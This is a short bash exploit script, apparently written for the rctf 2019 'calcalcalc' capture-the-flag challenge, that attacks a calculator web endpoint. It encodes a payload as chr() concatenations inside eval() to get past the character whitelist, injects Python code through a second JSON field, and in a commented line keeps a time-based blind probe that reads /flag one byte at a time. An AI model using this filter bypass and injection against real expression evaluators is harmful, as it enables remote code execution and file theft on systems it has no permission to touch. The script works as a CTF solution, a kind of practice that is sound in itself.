# curl -s -q http://127.0.0.1:3000/calculate \
# curl -s -q https://calcalcalc.2019.rctf.rois.io/calculate -x http://127.0.0.1:1086 \

# /^[0-9a-z\[\]\(\)\+\-\*\/ \t]+$/
# 0-9a-z [] () + - * / \t


function get(){
    local exp=$1
    local v=$2
    curl -q -s http://127.0.0.1:3000/calculate \
    -H "Content-Type: application/json" \
    -d "{\"expression\":\"$exp\",\"isVip\":true,\"v\":\"$v\"}" \
    --output -
}

function wrap(){
    local s=$1
    local arr=()
    echo "[+] Payload : >> $s <<" >&2 
    echo -n "eval("
    for i in `seq ${#s}`
    do
        printf "chr(%d)+" \'${s:$i-1:1}
    done
    echo "chr(32))"
}

# exp="__import__('time').sleep(3) if ord(open('/flag').read()[3]) > 67 else None"
exp="eval(str(expr['v'])) if 1 else 0"
exp=$(wrap $exp)
get $exp "1+1"
# get "aaa"

echo 
echo 
echo 
echo 
# 40,0,0,0,2,i,s,v,i,p,0,2,0,0,0,49,0,2,e,x,p,r,e,s,s,i,o,n,0,6,0,0,0,1,+,1,2,3,0,0